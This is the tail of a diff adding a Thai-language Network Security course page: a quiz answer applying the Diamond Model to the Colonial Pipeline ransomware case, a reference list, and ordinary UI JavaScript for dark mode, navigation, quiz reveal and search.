+</div>
+
+<div class="quiz-card" data-question="10">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 10</span>
+    <p>Diamond Model of Intrusion Analysis มีกี่องค์ประกอบ? จงยกตัวอย่างการประยุกต์ใช้กับกรณี Colonial Pipeline</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">🔍 ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> Diamond Model มี <strong>4 องค์ประกอบหลัก</strong> (4 มุม): (1) <strong>Adversary</strong> — ผู้โจมตี; (2) <strong>Capability</strong> — เครื่องมือ; (3) <strong>Infrastructure</strong> — โครงสร้างพื้นฐาน; (4) <strong>Victim</strong> — เหยื่อ + 2 Event Meta-Features: Social-Political และ Technology <strong>การประยุกต์ใช้กับ Colonial Pipeline:</strong> <strong>Adversary</strong> = DarkSide (RaaS Affiliate); <strong>Capability</strong> = DarkSide Ransomware + Cobalt Strike + PowerShell; <strong>Infrastructure</strong> = Tor Network สำหรับ C2 + Bitcoin Wallet; <strong>Victim</strong> = Colonial Pipeline (โครงสร้างพื้นฐานน้ำมันสหรัฐฯ); <strong>Social-Political</strong> = ผลประโยชน์ทางการเงิน (ค่าไถ่ 4.4 ล้าน USD); <strong>Technology</strong> = Legacy VPN ไม่มี MFA → Credential Theft → RDP Lateral Movement → Encrypt OT Systems</p>
+  </div>
+</div>
+</section>
+<hr>
+
+<!-- ====== REFERENCES ====== -->
+<section id="references" class="section-ref">
+<h2><i class="fas fa-book" aria-hidden="true"></i> เอกสารอ้างอิง (References)</h2>
+
+<h3>มาตรฐานและกรอบการทำงาน</h3>
+<ol>
+  <li>MITRE. (2024). <em>MITRE ATT&CK Framework v14</em>. https://attack.mitre.org/</li>
+  <li>NIST SP 800-207. (2020). <em>Zero Trust Architecture</em>.</li>
+  <li>NIST SP 800-30 Rev. 1. (2012). <em>Guide for Conducting Risk Assessments</em>.</li>
+  <li>Lockheed Martin. (2011). <em>Intelligence-Driven Computer Network Defense Informed by Analysis of Adversary Campaigns and Intrusion Kill Chains</em>.</li>
+  <li>CISA. (2023). <em>Zero Trust Maturity Model v2.0</em>.</li>
+  <li>Kindervag, J. (2010). <em>Build Security Into Your Network's DNA: The Zero Trust Model of Information Security</em>. Forrester Research.</li>
+  <li>Pols, P. (2017). <em>The Unified Kill Chain</em>.</li>
+  <li>Caltagirone, S., et al. (2013). <em>The Diamond Model of Intrusion Analysis</em>.</li>
+  <li>OWASP. (2024). <em>Threat Modeling Cheat Sheet</em>.</li>
+</ol>
+
+<h3>ตำราหลัก</h3>
+<ol start="10">
+  <li>Stallings, W. (2022). <em>Cryptography and Network Security: Principles and Practice</em> (8th ed.). Pearson.</li>
+  <li>Whitman, M. E., &amp; Mattord, H. J. (2021). <em>Principles of Information Security</em> (7th ed.). Cengage Learning.</li>
+  <li>Howard, M., &amp; Lipner, S. (2006). <em>The Security Development Lifecycle</em>. Microsoft Press.</li>
+  <li>UcedaVelez, T., &amp; Morana, M. M. (2015). <em>Risk Centric Threat Modeling: Process for Attack Simulation and Threat Analysis</em>. Wiley.</li>
+</ol>
+
+<h3>รายงานและกรณีศึกษา</h3>
+<ol start="14">
+  <li>Verizon. (2025). <em>2025 Data Breach Investigations Report</em>.</li>
+  <li>IBM Security &amp; Ponemon Institute. (2025). <em>Cost of a Data Breach Report 2025</em>.</li>
+  <li>ENISA. (2025). <em>ENISA Threat Landscape 2025</em>.</li>
+  <li>Sophos. (2025). <em>State of Ransomware 2025</em>.</li>
+  <li>Chainalysis. (2025). <em>2025 Crypto Ransomware Report</em>.</li>
+  <li>Check Point. (2025). <em>State of Ransomware Q3 2025</em>.</li>
+  <li>Google. (2014). <em>BeyondCorp: A New Approach to Enterprise Security</em>.</li>
+</ol>
+
+<h3>แหล่งข้อมูลเพิ่มเติม</h3>
+<ol start="21">
+  <li>OWASP Top 10 — 2021. https://owasp.org/Top10/</li>
+  <li>NIST National Vulnerability Database. https://nvd.nist.gov/</li>
+  <li>CISA Known Exploited Vulnerabilities Catalog. https://www.cisa.gov/known-exploited-vulnerabilities-catalog</li>
+  <li>SANS Institute. https://www.sans.org/</li>
+  <li>OWASP Threat Modeling. https://owasp.org/www-community/Threat_Modeling</li>
+</ol>
+</section>
+</main>
+</div> <!-- .layout -->
+
+<footer class="site-footer" role="contentinfo">
+  <hr class="footer-divider">
+  <p><i class="fas fa-shield-halved" aria-hidden="true"></i> รายวิชา Network Security | ภาคเรียนที่ 1 ปีการศึกษา 2569</p>
+  <p style="margin-top:0.5rem;font-size:0.8rem;">เอกสารนี้เป็นส่วนหนึ่งของรายวิชา Network Security | ภาคเรียนที่ 1 ปีการศึกษา 2569</p>
+</footer>
+
+<button id="back-to-top" aria-label="กลับไปด้านบน" title="กลับไปด้านบน">
+  <i class="fas fa-arrow-up" aria-hidden="true"></i>
+</button>
+
+<script>
+// ====== Loading Screen ======
+window.addEventListener('load', function() {
+  document.getElementById('loading-screen').classList.add('hidden');
+});
+
+// ====== Progress Bar ======
+window.addEventListener('scroll', function() {
+  var scrollTop = window.scrollY;
+  var docHeight = document.documentElement.scrollHeight - window.innerHeight;
+  var progress = docHeight > 0 ? (scrollTop / docHeight) * 100 : 0;
+  document.getElementById('progress-bar').style.width = progress + '%';
+  document.getElementById('progress-bar').setAttribute('aria-valuenow', Math.round(progress));
+});
+
+// ====== Dark Mode ======
+(function() {
+  var toggle = document.getElementById('dark-mode-toggle');
+  var icon = toggle.querySelector('i');
+  var theme = localStorage.getItem('theme');
+  if (theme === 'dark') {
+    document.documentElement.setAttribute('data-theme', 'dark');
+    icon.className = 'fas fa-sun';
+  }
+  toggle.addEventListener('click', function() {
+    var current = document.documentElement.getAttribute('data-theme');
+    if (current === 'dark') {
+      document.documentElement.removeAttribute('data-theme');
+      localStorage.setItem('theme', 'light');
+      icon.className = 'fas fa-moon';
+    } else {
+      document.documentElement.setAttribute('data-theme', 'dark');
+      localStorage.setItem('theme', 'dark');
+      icon.className = 'fas fa-sun';
+    }
+  });
+})();
+
+// ====== Sidebar Toggle (mobile) ======
+(function() {
+  var btn = document.getElementById('sidebar-toggle');
+  var sidebar = document.getElementById('sidebar');
+  var overlay = document.getElementById('sidebar-overlay');
+  if (!btn || !sidebar || !overlay) return;
+  btn.addEventListener('click', function() {
+    var open = sidebar.classList.toggle('open');
+    overlay.classList.toggle('active');
+    btn.setAttribute('aria-expanded', open);
+  });
+  overlay.addEventListener('click', function() {
+    sidebar.classList.remove('open');
+    overlay.classList.remove('active');
+    btn.setAttribute('aria-expanded', 'false');
+  });
+})();
+
+// ====== Scroll Spy ======
+(function() {
+  var tocLinks = document.querySelectorAll('.toc-link');
+  var sections = [];
+  tocLinks.forEach(function(link) {
+    var targetId = link.getAttribute('data-target');
+    var el = document.getElementById(targetId);
+    if (el) sections.push({ id: targetId, el: el, link: link });
+  });
+  
+  function updateActive() {
+    var scrollPos = window.scrollY + 120;
+    var currentId = null;
+    for (var i = 0; i < sections.length; i++) {
+      var s = sections[i];
+      if (s.el.offsetTop <= scrollPos) {
+        currentId = s.id;
+      }
+    }
+    tocLinks.forEach(function(l) { l.classList.remove('active'); });
+    if (currentId) {
+      var activeLink = document.querySelector('.toc-link[data-target="' + currentId + '"]');
+      if (activeLink) {
+        activeLink.classList.add('active');
+        var sidebar = document.getElementById('sidebar');
+        if (sidebar) {
+          var itemTop = activeLink.offsetTop - sidebar.offsetTop;
+          var itemBottom = itemTop + activeLink.offsetHeight;
+          var sidebarScrollTop = sidebar.scrollTop;
+          var sidebarHeight = sidebar.clientHeight;
+          if (itemTop < sidebarScrollTop) {
+            activeLink.scrollIntoView({ block: 'nearest' });
+          } else if (itemBottom > sidebarScrollTop + sidebarHeight) {
+            activeLink.scrollIntoView({ block: 'nearest' });
+          }
+        }
+      }
+    }
+  }
+  
+  window.addEventListener('scroll', updateActive);
+  window.addEventListener('load', updateActive);
+  setTimeout(updateActive, 500);
+})();
+
+// ====== Smooth scroll for TOC links ======
+document.querySelectorAll('.toc-link').forEach(function(link) {
+  link.addEventListener('click', function(e) {
+    e.preventDefault();
+    var targetId = this.getAttribute('data-target');
+    var target = document.getElementById(targetId);
+    if (target) {
+      var offset = 80;
+      var targetPos = target.getBoundingClientRect().top + window.scrollY - offset;
+      window.scrollTo({ top: targetPos, behavior: 'smooth' });
+    }
+    var sidebar = document.getElementById('sidebar');
+    var overlay = document.getElementById('sidebar-overlay');
+    if (sidebar && sidebar.classList.contains('open')) {
+      sidebar.classList.remove('open');
+      overlay.classList.remove('active');
+      document.getElementById('sidebar-toggle').setAttribute('aria-expanded', 'false');
+    }
+  });
+});
+
+// ====== Back to Top ======
+(function() {
+  var btn = document.getElementById('back-to-top');
+  window.addEventListener('scroll', function() {
+    if (window.scrollY > 400) {
+      btn.classList.add('visible');
+    } else {
+      btn.classList.remove('visible');
+    }
+  });
+  btn.addEventListener('click', function() {
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  });
+})();
+
+// ====== Copy Code ======
+function copyCode(btn) {
+  var pre = btn.closest('pre');
+  var code = pre.textContent;
+  code = code.replace(/คัดลอก/g, '').trim();
+  navigator.clipboard.writeText(code).then(function() {
+    btn.innerHTML = '<i class="fas fa-check" aria-hidden="true"></i> คัดลอกแล้ว';
+    btn.classList.add('copied');
+    setTimeout(function() {
+      btn.innerHTML = '<i class="fas fa-copy" aria-hidden="true"></i> คัดลอก';
+      btn.classList.remove('copied');
+    }, 2000);
+  }).catch(function() {
+    var textarea = document.createElement('textarea');
+    textarea.value = code;
+    document.body.appendChild(textarea);
+    textarea.select();
+    document.execCommand('copy');
+    document.body.removeChild(textarea);
+    btn.innerHTML = '<i class="fas fa-check" aria-hidden="true"></i> คัดลอกแล้ว';
+    btn.classList.add('copied');
+    setTimeout(function() {
+      btn.innerHTML = '<i class="fas fa-copy" aria-hidden="true"></i> คัดลอก';
+      btn.classList.remove('copied');
+    }, 2000);
+  });
+}
+
+// ====== Expandable Sections ======
+function toggleExpand(header) {
+  var expandable = header.closest('.expandable');
+  if (!expandable) return;
+  var isExpanded = expandable.classList.toggle('expanded');
+  header.setAttribute('aria-expanded', isExpanded);
+}
+
+// ====== Reveal Answer (Quiz) ======
+function revealAnswer(btn) {
+  var card = btn.closest('.quiz-card');
+  if (!card) return;
+  card.classList.add('revealed');
+  var answer = card.querySelector('.quiz-answer');
+  if (answer) {
+    answer.classList.remove('hidden');
+  }
+  btn.textContent = '\u2705 \u0e14\u0e39\u0e40\u0e09\u0e25\u0e22\u0e41\u0e25\u0e49\u0e27';
+  btn.disabled = true;
+}
+
+// ====== Search ======
+(function() {
+  var searchToggle = document.getElementById('search-toggle-btn');
+  var searchOverlay = document.getElementById('search-overlay');
+  var searchInput = document.getElementById('search-input');
+  var searchResults = document.getElementById('search-results');
+  var searchCount = document.getElementById('search-count');
+  var searchClose = document.getElementById('search-close-btn');
+  
+  var mainContent = document.getElementById('main-content');
+  var searchData = [];
+  
+  function buildSearchIndex() {
+    searchData = [];
+    var sections = mainContent.querySelectorAll('h2, h3, h4, p, li, td, th, pre');
+    sections.forEach(function(el) {
+      var text = el.textContent.trim();
+      if (text.length > 10) {
+        var heading = '';
+        var parent = el.parentElement;
+        while (parent && parent !== mainContent) {
+          var prevHeading = parent.querySelector('h2, h3, h4');
+          if (prevHeading) { heading = prevHeading.textContent.trim(); break; }
+          parent = parent.parentElement;
+        }
+        searchData.push({
+          text: text,
+          heading: heading || '\u0e40\u0e19\u0e37\u0e49\u0e2d\u0e2b\u0e32',
+          element: el
+        });
+      }
+    });
+  }
+  
+  buildSearchIndex();
+  
+  function performSearch(query) {
+    if (!query || query.length < 2) {
+      searchResults.innerHTML = '<div class="no-results">\u0e01\u0e23\u0e38\u0e13\u0e32\u0e1b\u0e49\u0e2d\u0e19\u0e04\u0e33\u0e04\u0e49\u0e19\u0e2b\u0e32\u0e2d\u0e22\u0e48\u0e32\u0e07\u0e19\u0e49\u0e2d\u0e22 2 \u0e15\u0e31\u0e27\u0e2d\u0e31\u0e01\u0e29\u0e23</div>';
+      searchCount.textContent = '';
+      return;
+    }
+    
+    var q = query.toLowerCase();
+    var results = [];
+    var totalMatches = 0;
+    
+    searchData.forEach(function(item) {
+      var lower = item.text.toLowerCase();
+      var idx = lower.indexOf(q);
+      if (idx !== -1) {
+        var count = 0;
+        var pos = -1;
+        while ((pos = lower.indexOf(q, pos + 1)) !== -1) count++;
+        totalMatches += count;
+        
+        var snippet = item.text.substring(Math.max(0, idx - 60), idx + q.length + 120);
+        if (idx > 60) snippet = '...' + snippet;
+        if (idx + q.length + 120 < item.text.length) snippet = snippet + '...';
+        
+        snippet = snippet.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        snippet = snippet.replace(new RegExp('(' + q.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')', 'gi'), '<mark>$1</mark>');
+        
+        results.push({
+          heading: item.heading,
+          snippet: snippet,
+          element: item.element,
+          count: count
+        });
+      }
+    });
+    
+    if (results.length > 50) results = results.slice(0, 50);
+    
+    searchCount.textContent = totalMatches + ' \u0e1c\u0e25\u0e25\u0e31\u0e1e\u0e18\u0e4c';
+    
+    if (results.length === 0) {
+      searchResults.innerHTML = '<div class="no-results">\u0e44\u0e21\u0e48\u0e1e\u0e1a\u0e1c\u0e25\u0e25\u0e31\u0e1e\u0e18\u0e4c\u0e2a\u0e33\u0e2b\u0e23\u0e31\u0e1a "' + query + '"</div>';
+      return;
+    }
+    
+    var html = '';
+    results.forEach(function(r) {
+      html += '<div class="search-result-item" data-heading="' + r.heading.replace(/"/g, '&quot;') + '">';
+      html += '<div class="result-heading">' + r.heading + '</div>';
+      html += '<div class="result-snippet">' + r.snippet + '</div>';
+      html += '</div>';
+    });
+    searchResults.innerHTML = html;
+    
+    searchResults.querySelectorAll('.search-result-item').forEach(function(item, i) {
+      item.addEventListener('click', function() {
+        var el = results[i].element;
+        if (el) {
+          var offset = 100;
+          var pos = el.getBoundingClientRect().top + window.scrollY - offset;
+          window.scrollTo({ top: pos, behavior: 'smooth' });
+          searchOverlay.classList.remove('active');
+          el.style.transition = 'background 0.5s ease';
+          el.style.background = 'var(--bg-tertiary)';
+          setTimeout(function() {
+            el.style.background = '';
+          }, 1500);
+        }
+      });
+    });
+  }
+  
+  var searchTimeout = null;
+  searchInput.addEventListener('input', function() {
+    clearTimeout(searchTimeout);
+    searchTimeout = setTimeout(function() {
+      performSearch(searchInput.value);
+    }, 300);
+  });
+  
+  searchToggle.addEventListener('click', function() {
+    searchOverlay.classList.add('active');
+    setTimeout(function() { searchInput.focus(); }, 100);
+  });
+  
+  searchClose.addEventListener('click', function() {
+    searchOverlay.classList.remove('active');
+    searchInput.value = '';
+    searchResults.innerHTML = '';
+    searchCount.textContent = '';
+  });
+  
+  searchOverlay.addEventListener('click', function(e) {
+    if (e.target === searchOverlay) {
+      searchOverlay.classList.remove('active');
+      searchInput.value = '';
+      searchResults.innerHTML = '';
+      searchCount.textContent = '';
+    }
+  });
+  
+  document.addEventListener('keydown', function(e) {
+    if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+      e.preventDefault();
+      searchToggle.click();
+    }
+    if (e.key === 'Escape') {
+      searchOverlay.classList.remove('active');
+    }
+  });
+})();
+
+// ====== Ensure all expandable case studies start expanded ======
+document.addEventListener('DOMContentLoaded', function() {
+  document.querySelectorAll('.expandable.expanded').forEach(function(el) {
+    var header = el.querySelector('.expandable-header');
+    if (header) header.setAttribute('aria-expanded', 'true');
+  });
+});
+</script>
+</body>
+</html>
